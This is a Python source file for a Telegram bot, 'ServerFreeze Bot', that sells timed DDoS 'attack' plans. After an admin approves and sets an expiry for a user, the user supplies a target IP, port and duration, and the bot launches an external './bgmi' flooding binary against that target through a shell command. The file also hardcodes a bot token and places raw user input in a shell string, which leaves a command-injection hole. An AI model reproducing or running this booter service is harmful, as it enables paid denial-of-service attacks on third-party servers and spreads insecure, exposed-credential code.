import os
import telebot
import logging
import time
import random
from datetime import datetime, timedelta
from subprocess import Popen
from threading import Thread
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

loop = asyncio.new_event_loop()

# --- Configurations ---
TOKEN = '7149714912:AAEeGl6cSo1IG3y6Tuf6aomE62Uoc5Xtqjw'
ADMIN_ID = 7149714912  # Apna Admin ID yaha daalein
CHANNEL_ID = -1003886707055
USER_FILE = "users.txt"

bot = telebot.TeleBot(TOKEN)
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# --- File Operations (Database Replacement) ---

def load_users():
    """File se users load karke dictionary banata hai"""
    users = {}
    if os.path.exists(USER_FILE):
        with open(USER_FILE, "r") as f:
            for line in f:
                try:
                    # Format: user_id,plan,valid_until
                    u_id, plan, expiry = line.strip().split(',')
                    users[int(u_id)] = {"plan": int(plan), "valid_until": expiry}
                except:
                    continue
    return users

def save_user(user_id, plan, days):
    """User ko file mein save karta hai"""
    expiry_date = (datetime.now() + timedelta(days=days)).date().isoformat()
    users = load_users()
    users[user_id] = {"plan": plan, "valid_until": expiry_date}
    
    with open(USER_FILE, "w") as f:
        for u_id, data in users.items():
            f.write(f"{u_id},{data['plan']},{data['valid_until']}\n")
    return expiry_date

def remove_user(user_id):
    """User ko file se hatata hai"""
    users = load_users()
    if user_id in users:
        del users[user_id]
        with open(USER_FILE, "w") as f:
            for u_id, data in users.items():
                f.write(f"{u_id},{data['plan']},{data['valid_until']}\n")

# --- Async Attack Logic ---

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 500")
    await process.communicate()

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

# --- Bot Handlers ---

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Instant Plan 🧡"), KeyboardButton("Instant++ Plan 💥"),
               KeyboardButton("Canary Download✔️"), KeyboardButton("My Account🏦"),
               KeyboardButton("Help❓"), KeyboardButton("Contact admin✔️"))
    bot.send_message(message.chat.id, "*Welcome to ServerFreeze Bot!*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Only Admin can use this.")
        return

    try:
        # Format: /approve 12345678 2 30
        cmd_parts = message.text.split()
        target_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])
        
        expiry = save_user(target_id, plan, days)
        bot.send_message(message.chat.id, f"✅ User {target_id} approved!\nPlan: {plan}\nExpiry: {expiry}")
    except:
        bot.reply_to(message, "Usage: /approve <user_id> <plan> <days>")

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        target_id = int(message.text.split()[1])
        remove_user(target_id)
        bot.reply_to(message, f"❌ User {target_id} removed.")
    except:
        bot.reply_to(message, "Usage: /disapprove <user_id>")

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    users = load_users()
    
    if user_id not in users:
        bot.reply_to(message, "❌ You are not approved. Contact @BLACK_XOWNER")
        return

    # Expiry Check
    expiry = datetime.strptime(users[user_id]['valid_until'], '%Y-%m-%d').date()
    if expiry < datetime.now().date():
        bot.reply_to(message, "❌ Your plan has expired!")
        return

    bot.send_message(message.chat.id, "Enter IP, Port, and Duration (e.g. 1.1.1.1 80 60):")
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        target_ip, target_port, duration = args[0], int(args[1]), args[2]
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, "❌ This port is blocked.")
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"🚀 Attack Started!\nIP: {target_ip}\nPort: {target_port}\nTime: {duration}s")
    except:
        bot.send_message(message.chat.id, "❌ Invalid input.")

@bot.message_handler(func=lambda m: True)
def handle_menu(message):
    if message.text == "My Account🏦":
        users = load_users()
        user_id = message.from_user.id
        if user_id in users:
            data = users[user_id]
            bot.reply_to(message, f"👤 ID: {user_id}\n📊 Plan: {data['plan']}\n📅 Expiry: {data['valid_until']}")
        else:
            bot.reply_to(message, "❌ No active plan found.")
    elif message.text == "Instant++ Plan 💥":
        attack_command(message)
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "Admin: @BLACK_XOWNER")

# --- Start ---
if __name__ == "__main__":
    Thread(target=start_asyncio_thread, daemon=True).start()
    logging.info("🤖 Bot is starting (File System)...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            time.sleep(5)
